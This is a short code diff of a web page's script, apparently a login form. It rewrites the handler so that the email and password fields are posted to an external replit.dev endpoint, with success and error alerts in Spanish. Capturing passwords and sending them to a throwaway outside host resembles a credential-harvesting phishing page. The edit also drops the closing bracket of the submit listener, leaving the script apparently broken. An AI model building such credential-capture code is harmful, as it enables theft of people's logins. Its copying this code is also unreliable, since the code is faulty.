@@ -142,12 +142,27 @@
       password: this.password.value
     };
 
-    fetch("https://24fb22b1-ac17-4147-8b76-b84d03afe8c2-00-14r6zwjdn77nl.riker.replit.dev/", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    }).then(() => alert("Datos enviados"));
-  });
+  fetch("https://24fb22b1-ac17-4147-8b76-b84d03afe8c2-00-14r6zwjdn77nl.riker.replit.dev/datos", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    email: document.getElementById("email").value,
+    password: document.getElementById("password").value
+  })
+})
+.then(response => {
+  if (response.ok) {
+    alert("Formulario enviado correctamente.");
+  } else {
+    alert("Error al enviar el formulario.");
+  }
+})
+.catch(error => {
+  console.error("Error:", error);
+});
+
 
 </script>
 </body>
